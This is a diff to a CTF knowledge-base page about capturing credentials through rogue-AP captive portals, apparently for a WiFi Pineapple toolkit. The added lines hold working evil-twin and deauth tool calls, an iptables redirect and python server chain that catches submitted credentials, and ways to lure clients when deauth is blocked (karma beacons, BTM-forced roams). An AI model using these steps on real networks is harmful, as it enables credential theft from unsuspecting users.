@@ -1,5 +1,7 @@
 # Captive-portal cred flags
 
+**Verified against:** P1N3NUT5 knowledge corpus as of 2026-Q3
+
 ## The puzzle shape
 
 The AP is open (or PSK-known). Associating drops you into a captive
@@ -23,18 +25,35 @@ You stand up your own captive portal on a rogue AP alongside the
 target. Victim clients associate to you, hit your portal, type
 credentials — those credentials are the flag.
 
-```
+MCP tools available: `do_create_rogue_ap`, `do_deauth`. **Not in
+`src/`:** `serve_captive_portal` — drive nodogsplash / apache /
+python http.server on the Pineapple over SSH instead.
+
+```python
 # 1. Clone the target SSID.
 do_create_rogue_ap(ssid="WCTF-Public", channel=6, security="open",
                    i_own_the_airspace=True)
 # 2. Bring up a captive portal that templates the target vendor's
-#    login page.
-serve_captive_portal(handle=<rogue-handle>, template="basic")
+#    login page (fallback shell — see below).
 # 3. Deauth clients off the real AP so they reassociate to you.
-do_deauth(bssid=<target-bssid>, count=10,
+do_deauth(bssid="<target-bssid>", count=10,
           i_own_the_airspace=True)
 # 4. Watch the credential log.
-tail -f /tmp/portal-creds.log
+# tail -f /tmp/portal-creds.log
+```
+
+**Fallback shell chain — captive portal (steps 2 + 4):**
+
+```bash
+# On the Pineapple over SSH — nodogsplash is the classic option
+sudo /etc/init.d/nodogsplash start
+tail -f /tmp/nodogsplash/ndsctl.log
+
+# Or a minimal python cred-catcher:
+sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 \
+    -j REDIRECT --to-port 8080
+sudo python3 -m http.server 8080 --directory /root/portal &
+# Any POST body is logged; wrap in a real script to persist creds.
 ```
 
 ## Signs a portal IS a trap (defender view)
@@ -46,7 +65,34 @@ tail -f /tmp/portal-creds.log
 - The portal insists on "sign in" for a network the client has
   been on before (real captive portals honor a re-auth cookie).
 
+## What still works when PMF-required
+
+The Case B flow above deauths victims off the real AP to force
+reassoc to your open-portal rogue. When the real AP is
+PMF-required (or 6 GHz), step 3 `do_deauth` is a no-op — but the
+rest of the captive-portal cred-capture flow is intact:
+
+- **Beat the target on RSSI + karma-family attraction.** Stand up
+  the rogue louder than the real AP; probing clients that match
+  your SSID (via Known Beacons or a matching Probe Response)
+  associate on their own, before any deauth would matter.
+- **Cold-start clients.** Any client that hasn't associated to
+  the real AP yet has no PMF context. Set the twin up early and
+  wait — arrivals attach to the loudest match.
+- **BTM-forced roam.** If the real AP vendor honors unauth'd
+  Category 10 BTM Requests, hint the target toward your rogue
+  BSSID; the client cooperates in its own move.
+- **Wait for natural reassoc events.** Roams, band steers, and
+  AP outages all produce clean reassociation opportunities that
+  a louder rogue wins.
+- **Case A still works verbatim.** If the flag is *in* the
+  portal itself (page source, JS, API response), you never
+  needed a victim — just associate to the real AP yourself and
+  browse. PMF has no bearing.
+
 ## Cite
 
-- attacks.json: `captive-portal-cred-capture`, `evil-twin-clone`.
+- attacks.json: `captive-portal-cred-capture`, `evil-twin-clone`,
+  `btm-forced-roam`, `mana-known-beacons`.
 - knowledge/captive-portal/reference.md.
+- knowledge/ctf/pmf-required-targets.md.
